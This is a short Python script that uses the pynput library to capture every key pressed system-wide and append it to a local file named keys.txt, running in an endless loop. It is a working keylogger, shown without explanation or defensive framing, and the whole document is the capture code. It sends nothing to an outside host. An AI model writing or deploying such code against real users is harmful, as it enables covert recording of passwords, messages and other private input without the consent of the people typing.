from pynput import keyboard


def handle_keys(key: keyboard.Key):
    with open('keys.txt', 'a') as file_:
        file_.write(str(key).strip("'"))


if __name__ == '__main__':
    listener = keyboard.Listener(on_press=handle_keys)
    listener.start()

    while True:
        input()
